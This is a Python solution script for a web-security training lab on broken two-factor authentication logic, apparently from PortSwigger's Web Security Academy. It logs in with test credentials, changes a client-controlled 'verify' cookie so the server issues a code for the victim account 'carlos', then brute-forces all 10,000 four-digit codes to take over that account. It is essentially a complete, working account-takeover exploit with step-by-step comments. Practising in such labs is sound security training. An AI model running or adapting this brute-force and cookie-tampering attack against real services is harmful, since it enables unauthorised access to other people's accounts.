# LAB: 2FA broken logic
import requests
from pathlib import Path

BASE = "https://0abd009203c1d84c80cc4949009b00a7.web-security-academy.net"
VICTIM = "carlos"          # Target account ID

s = requests.Session()

print("===========[step1] login as wiener===============")
r = s.post(
    f"{BASE}/login",
    data={"username": "wiener", "password": "peter"},
    allow_redirects=False,
)
print(r.status_code, dict(r.cookies))
'''
HTTP/2 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
-> First factor passed. The 'verify' cookie holds "who the current 2FA target is"
   (a client-controlled value!).
'''

print("===========[step2] set verify=victim & issue victim's code (ONCE)===============")
# Change the 'verify' cookie to the victim, then send GET /login2 exactly ONCE
# to make the server issue a security code for the victim.
s.cookies.set("verify", VICTIM)
r = s.get(f"{BASE}/login2", allow_redirects=False)
print(r.status_code)
'''
HTTP/2 200 OK  -> 4-digit code input form. At this moment a code is issued for carlos.
NOTE: Calling GET /login2 again inside the loop would re-issue a new code every time
      and break things. Issue it only once, here.
'''

print("===========[step3] prep 4-digit code for brute-force===============")

cwd = Path(__file__).resolve().parent
pass_file = cwd / "4digit.txt"
nums = []
def make_4digit():
    global nums
    for num in range(10000):
        nums.append(f"{num:04d}")
    with open(pass_file, 'w', encoding="utf-8") as writefile:
        for element in nums:
            writefile.write(element + "\n")

if pass_file.exists() == False:
    make_4digit()
elif pass_file.stat().st_size < 1024:
    # Wipe existing content clean
    with open(pass_file, "w") as original_file:
        original_file.truncate(0)
    make_4digit()

with open(pass_file, 'r', encoding="utf-8") as readfile:
    pass_candidates = readfile.read().splitlines()

print("[*] 4-digit code cases prepared")

print("===========[step4] Execute brute-force===============")
# Single-threaded on purpose: stop right after success so no extra requests
# are sent that would log the victim session back out.
for code in pass_candidates:
    r = s.post(f"{BASE}/login2", data={"mfa-code": code}, allow_redirects=False)
    if r.status_code == 302:
        print("correct 4digit code:", code)
        break


print("===========[step5] confirm access to victim account===============")
# After success the 's' session is authenticated as carlos -> access /my-account
page_carlos = s.get(f"{BASE}/my-account", allow_redirects=True)
print(page_carlos.status_code, page_carlos.url)